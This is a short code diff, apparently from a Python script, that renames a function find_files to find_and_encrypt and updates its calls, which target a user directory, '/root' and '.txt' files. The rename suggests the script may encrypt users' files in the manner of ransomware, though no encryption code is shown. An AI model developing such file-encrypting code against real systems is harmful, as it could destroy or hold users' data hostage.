@@ -31,7 +31,7 @@ def check_os(osname: str) -> str | None:
                  ROOT_PATH="/root")
 
 
-def find_files(
+def find_and_encrypt(
     path: str,
     ext_files: list,
     hidden: str,
@@ -231,7 +231,7 @@ def main(USER_DIR: str, ROOT_PATH: str) -> str | None:
                     "ROOT_PATH"
                 )
                 
-                find_files(
+                find_and_encrypt(
                     path=USER_DIR,
                     ext_files=['.txt'],
                     hidden='.',
@@ -241,7 +241,7 @@ def main(USER_DIR: str, ROOT_PATH: str) -> str | None:
                 )
 
     else:
-        find_files(
+        find_and_encrypt(
             path=USER_DIR,
             ext_files=['.txt'],
             hidden='.',
